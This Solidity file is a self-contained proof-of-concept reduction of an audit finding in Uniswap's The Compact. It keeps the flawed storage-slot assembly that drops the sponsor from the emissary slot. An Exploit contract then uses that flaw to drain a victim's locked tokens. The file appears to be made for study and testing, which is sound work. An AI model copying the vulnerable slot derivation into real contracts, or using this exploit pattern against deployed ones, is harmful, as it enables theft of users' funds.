// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Uniswap The Compact — Incorrect storage slot derivation breaks
    authorization (Spearbit May 2025, #61280)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: EmissaryLib._getEmissaryConfig packs sponsor at 0x14 then
    overwrites it with lockTag at 0x20, so keccak256(0x1c, 0x24) never
    includes the sponsor. All sponsors share one emissary config per lockTag;
    an attacker assigns their emissary and claims any user's resource locks.
    Vulnerable assembly preserved VERBATIM (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of The Compact emissary config + resource-lock claim path.
///         Source: EmissaryLib.sol#L65-L84 (Spearbit Uniswap The Compact May 2025).
contract TheCompact {
    uint256 private constant _EMISSARY_SCOPE = 0x2d5c707;

    MockERC20 public immutable token;
    /// @dev Locked balances keyed by sponsor => lockTag (authorization is via emissary slot).
    mapping(address => mapping(bytes12 => uint256)) public locked;

    constructor(MockERC20 _token) {
        token = _token;
    }

    function deposit(bytes12 lockTag, uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "in");
        locked[msg.sender][lockTag] += amount;
    }

    /// @notice Assign emissary for msg.sender + lockTag (intended per-sponsor isolation).
    function assignEmissary(bytes12 lockTag, address emissary) external {
        bytes32 slot = _emissarySlot(msg.sender, lockTag);
        assembly ("memory-safe") {
            sstore(slot, emissary)
        }
    }

    function getEmissary(address sponsor, bytes12 lockTag) external view returns (address e) {
        bytes32 slot = _emissarySlot(sponsor, lockTag);
        assembly ("memory-safe") {
            e := sload(slot)
        }
    }

    /// @notice Emissary claims locked tokens on behalf of sponsor.
    function claimAsEmissary(address sponsor, bytes12 lockTag, address to, uint256 amount) external {
        address current;
        bytes32 slot = _emissarySlot(sponsor, lockTag);
        assembly ("memory-safe") {
            current := sload(slot)
        }
        require(current == msg.sender, "not emissary");
        uint256 bal = locked[sponsor][lockTag];
        require(bal >= amount, "bal");
        locked[sponsor][lockTag] = bal - amount;
        require(token.transfer(to, amount), "out");
    }

    /// @dev Vulnerable slot derivation — sponsor is overwritten by lockTag in memory.
    function _emissarySlot(address sponsor, bytes12 lockTag) internal pure returns (bytes32 slot) {
        uint256 scope = _EMISSARY_SCOPE;
        assembly ("memory-safe") {
            // Pack data for computing storage slot.
            mstore(0x14, sponsor) // Offset 0x14 (20 bytes): Store 20-byte sponsor address
            mstore(0, scope) // Offset 0 (0 bytes): Store 4-byte scope value
            mstore(0x20, lockTag) // Offset 0x20 (12 bytes): Store 12-byte lock tag
            // Compute storage slot from packed data.
            // Intended: scope + sponsor + lockTag. Actual: sponsor wiped by lockTag.
            slot := keccak256(0x1c, 0x24) // @> VULN: lockTag at 0x20 overwrites sponsor — slot ignores sponsor, so any caller shares one emissary config per lockTag
        }
        // FIX: mstore(0x00, scope4); mstore(0x04, sponsor); mstore(0x24, lockTag); slot := keccak256(0x00, 0x30)
    }
}

contract Victim {
    TheCompact public compact;
    MockERC20 public token;

    constructor(TheCompact _c, MockERC20 _t) {
        compact = _c;
        token = _t;
    }

    function doDeposit(bytes12 lockTag, uint256 amount) external {
        token.approve(address(compact), amount);
        compact.deposit(lockTag, amount);
    }
}

contract AttackerRecv {}

/// CREATE order: token(1), compact(2), victim(3), attackerRecv(4).
contract Exploit {
    MockERC20 public token;
    TheCompact public compact;
    Victim public victim;
    AttackerRecv public attackerRecv;

    uint256 public stolen;
    bytes12 public constant LOCK_TAG = bytes12(uint96(0xffffffffffffffffffffffff));
    uint256 public constant LOCKED = 100 ether;

    constructor() {
        token = new MockERC20("LOCK"); // 1
        compact = new TheCompact(token); // 2
        victim = new Victim(compact, token); // 3
        attackerRecv = new AttackerRecv(); // 4

        token.mint(address(victim), LOCKED);
        // Victim locks funds under their own sponsor key.
        victim.doDeposit(LOCK_TAG, LOCKED);
    }

    function run() external {
        uint256 victimLockedBefore = compact.locked(address(victim), LOCK_TAG);
        require(victimLockedBefore == LOCKED, "locked");

        // Attacker assigns *their* address as emissary for the same lockTag.
        // Because the slot ignores sponsor, this overwrites the shared config
        // that getEmissary(victim, lockTag) also reads.
        compact.assignEmissary(LOCK_TAG, address(this));

        // Same slot: victim's "emissary" is now the attacker.
        require(compact.getEmissary(address(victim), LOCK_TAG) == address(this), "shared slot");
        require(compact.getEmissary(address(this), LOCK_TAG) == address(this), "attacker slot");

        uint256 recvBefore = token.balanceOf(address(attackerRecv));
        compact.claimAsEmissary(address(victim), LOCK_TAG, address(attackerRecv), LOCKED);

        stolen = token.balanceOf(address(attackerRecv)) - recvBefore;
        require(stolen == LOCKED, "stolen");
        require(compact.locked(address(victim), LOCK_TAG) == 0, "drained");
        require(stolen > 0, "harm not demonstrated");
    }
}
